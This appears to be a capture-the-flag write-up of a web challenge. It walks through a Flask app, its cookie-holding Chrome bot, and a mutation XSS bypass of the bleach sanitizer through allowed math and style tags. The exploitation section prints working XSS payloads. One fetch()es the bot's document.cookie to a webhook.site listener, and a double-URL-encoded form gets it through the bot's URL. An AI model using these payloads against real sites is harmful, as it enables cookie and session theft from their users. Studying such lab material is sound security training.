# Special Web
## Challenge overview
**Vulnerability:** Reflected XSS + Mutation XSS in Bleach v3.2.3 (`CVE-2021-23980`)

## Code analysis
### The goal
The objective is to retrieve a secret key used to authenticate "VIP" members. The source code reveals that the application checks a cookie named membership:
```python
@app.route('/')
def index():
    user_membership = request.cookies.get('membership', 'guest')

    VIP = False
    FLAG = None
    
    if user_membership == key:
        VIP = True
        FLAG = "B1N4RY{**redacted**}"
    
    response = make_response(render_template(
        'index.html', 
        membership=user_membership,
        is_vip=VIP,
        flag=FLAG
    ))

    if 'membership' not in request.cookies:
        response.set_cookie('membership', 'guest')

    return response
```
If the membership cookie matches the secret key, the flag is revealed

### The Bot (Victim)
The application provides a /send endpoint that triggers a headless Chrome bot. This bot:
- Sets the administrative membership cookie containing the secret key.
- Visits a URL provided by the user.

```python
def read_url(url):
    driver = None
    try:
        service = Service(executable_path="/usr/local/bin/chromedriver")
        options = webdriver.ChromeOptions()

        for opt in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(opt)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:5000/")
        driver.add_cookie({'name':'membership','value':f'{key}'})
        driver.get(url)
        time.sleep(1)

    except Exception as e:
        if driver:
            driver.quit()
        return False
    
    if driver:
        driver.quit()
    return True
```
```python
@app.route('/send')
def send():
    name = request.args.get('name')
    
    url = f'http://127.0.0.1:5000/event?msg={name}'
    
    result = read_url(url)
    
    if result:
        return '<script>alert("Submission received!"); history.back();</script>'
    else:
        return '<script>alert("An error occurred!"); history.back();</script>'
```

### Sanitization Bypass
The application uses the Python bleach library to sanitize user input before rendering it in the /event route.


Allowed Tags: ['a', 'b', 'br', 'font', 'h1', 'i', 'math', 'p', 'span', 'strong', 'style', 'u'] 

The Flaw: By allowing both math and style tags, the application becomes vulnerable to Mutation XSS, according to the [`CVE-2021-23980`](https://bugzilla.mozilla.org/show_bug.cgi?id=CVE-2021-23980).

## Exploitation
I used the following mutation XSS payload to trigger reflected XSS:
```javascript
<math></p><style><!--</style><img src/onerror=alert(1)>
```
After triggering the alert box successfully, I used the following payload to send the bot cookie to my listener (in this case I'm using [webhook](https://webhook.site)):
```js
<math></p><style><!--</style><img src/onerror=fetch('https://webhook.site/<YOUR_UNIQUE_ID>?cookie=' document.cookie)>
```
However, after observing on the webhook, I only saw my own cookie being sent, so I re-inspecting the source code. I realized that the name parameter in the /send endpoint is inserted directly into the f-string for the internal URL without any server-side URL-encoding. This means that if the payload contains special characters (like /, =, ?, ', (, ), or +), it could break the structure of the internal URL, causing the driver.get(url) to fail or load an invalid page
```python
def send():
    name = request.args.get('name')
    
    url = f'http://127.0.0.1:5000/event?msg={name}'
    
    result = read_url(url)
    # ...
```
So, I intercepted the request of the original payload and URL-encoded it again. 

The payload before being sent:
```
%253Cmath%253E%253C%252Fp%253E%253Cstyle%253E%253C%2521--%253C%252Fstyle%253E%253Cimg%2bsrc%252Fonerror%253Dfetch%2528%2527https%253A%252F%252Fwebhook.site%252F<YOUR_UNIQUE_ID>%253Fcookie%253D%2527%252Bdocument.cookie%2529%253E
```
When it reaches the server:
```
%3Cmath%3E%3C%2Fp%3E%3Cstyle%3E%3C%21--%3C%2Fstyle%3E%3Cimg+src%2Fonerror%3Dfetch%28%27https%3A%2F%2Fwebhook.site%2F<YOUR_UNIQUE_ID>%3Fcookie%3D%27%2Bdocument.cookie%29%3E
```
After retrieving the *secret membership* value, simply do a `GET` request at root directory with the cookie to retrieve the flag. 